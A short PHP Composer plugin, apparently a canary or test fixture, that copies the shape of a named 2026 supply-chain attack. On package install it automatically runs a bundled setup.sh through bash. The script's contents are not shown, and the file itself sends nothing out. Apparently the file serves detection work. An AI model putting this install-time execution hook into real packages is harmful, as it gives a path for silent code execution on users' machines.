<?php
namespace Canary;

use Composer\Composer;
use Composer\EventDispatcher\EventSubscriberInterface;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

// 2026 Mini Shai-Hulud shape (intercom-php 5.0.2): a plugin that runs a shipped script on install
class Plugin implements PluginInterface, EventSubscriberInterface
{
    public function activate(Composer $composer, IOInterface $io) {}
    public function deactivate(Composer $composer, IOInterface $io) {}
    public function uninstall(Composer $composer, IOInterface $io) {}
    public static function getSubscribedEvents() { return ['post-install-cmd' => 'run']; }
    public function run($event)
    {
        $script = __DIR__ . '/../setup.sh';
        passthru('bash ' . escapeshellarg($script), $code);
    }
}
